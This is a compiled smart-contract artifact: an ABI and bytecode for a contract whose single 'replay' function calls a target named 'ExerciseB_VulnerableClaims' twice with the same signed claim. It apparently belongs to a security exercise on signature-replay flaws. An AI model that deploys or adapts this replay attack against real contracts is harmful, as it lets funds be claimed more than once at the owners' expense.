{"abi":[{"type":"function","name":"replay","inputs":[{"name":"target","type":"address","internalType":"contract ExerciseB_VulnerableClaims"},{"name":"recipient","type":"address","internalType":"address payable"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"salt","type":"bytes32","internalType":"bytes32"},{"name":"sig","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b506104418061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80637a0f2b861461002d575b5f80fd5b610047600480360381019061004291906102a2565b610049565b005b8573ffffffffffffffffffffffffffffffffffffffff16638d9fa7bb86868686866040518663ffffffff1660e01b815260040161008a9594939291906103bf565b5f604051808303815f87803b1580156100a1575f80fd5b505af11580156100b3573d5f803e3d5ffd5b505050508573ffffffffffffffffffffffffffffffffffffffff16638d9fa7bb86868686866040518663ffffffff1660e01b81526004016100f89594939291906103bf565b5f604051808303815f87803b15801561010f575f80fd5b505af1158015610121573d5f803e3d5ffd5b50505050505050505050565b5f80fd5b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61015e82610135565b9050919050565b5f61016f82610154565b9050919050565b61017f81610165565b8114610189575f80fd5b50565b5f8135905061019a81610176565b92915050565b5f6101aa82610135565b9050919050565b6101ba816101a0565b81146101c4575f80fd5b50565b5f813590506101d5816101b1565b92915050565b5f819050919050565b6101ed816101db565b81146101f7575f80fd5b50565b5f81359050610208816101e4565b92915050565b5f819050919050565b6102208161020e565b811461022a575f80fd5b50565b5f8135905061023b81610217565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f84011261026257610261610241565b5b8235905067ffffffffffffffff81111561027f5761027e610245565b5b60208301915083600182028301111561029b5761029a610249565b5b9250929050565b5f805f805f8060a087890312156102bc576102bb61012d565b5b5f6102c989828a0161018c565b96505060206102da89828a016101c7565b95505060406102eb89828a016101fa565b94505060606102fc89828a0161022d565b935050608087013567ffffffffffffffff81111561031d5761031c610131565b5b61032989828a0161024d565b92509250509295509295509295565b610341816101a0565b82525050565b610350816101db565b82525050565b61035f8161020e565b82525050565b5f82825260208201905092915050565b828183375f83830152505050565b5f601f19601f8301169050919050565b5f61039e8385610365565b93506103ab838584610375565b6103b483610383565b840190509392505050565b5f6080820190506103d25f830188610338565b6103df6020830187610347565b6103ec6040830186610356565b81810360608301526103ff818486610393565b9050969550505050505056fea2646970667358221220e9c55d651b3b9b7e55943828e4b71af70d1e7d1534843550b63dd562f1b1a21a64736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"replay(address,address,uint256,bytes32,bytes)":"7a0f2b86"},"id":31}